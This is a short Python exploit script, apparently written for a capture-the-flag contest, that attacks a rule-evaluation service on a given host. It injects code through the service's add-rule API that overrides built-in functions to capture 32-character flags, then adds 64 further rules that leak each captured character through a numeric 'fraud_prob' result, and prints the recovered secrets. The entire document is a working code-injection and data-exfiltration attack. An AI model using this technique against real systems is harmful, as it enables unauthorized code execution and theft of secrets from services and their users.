#!/usr/bin/env python3

import sys
from common import call_get_rules_api, call_add_rule_api, call_check_user_api

PREFIX = "SPL1_"

PAYLOAD_START = """
def patched_sha256(flag):
    if len(flag) == 32:
        __builtins__["flags"] += [flag]
    return b"f" * 32

__builtins__["flags"] = []
__builtins__["sha256"] = patched_sha256
"""

PAYLOAD_END_TMPL = """
flags_str = str(flags) + " "*64
fraud_prob = ord(flags_str[%d]) - 32
"""

host = sys.argv[1]

start_rule_name = PREFIX + "start"
call_add_rule_api(host, start_rule_name, PAYLOAD_START)

end_rules = []
for i in range(64):
    end_rule_name = PREFIX + "end" + str(i)
    call_add_rule_api(host, end_rule_name, PAYLOAD_END_TMPL % i)
    end_rules.append(end_rule_name)


for rule in call_get_rules_api(host):
    ans = call_check_user_api(host, [start_rule_name, rule] + end_rules, 0)
    if ans is None:
        continue

    flag = "".join(chr(c + 32) for c in ans[2:])
    print(flag)
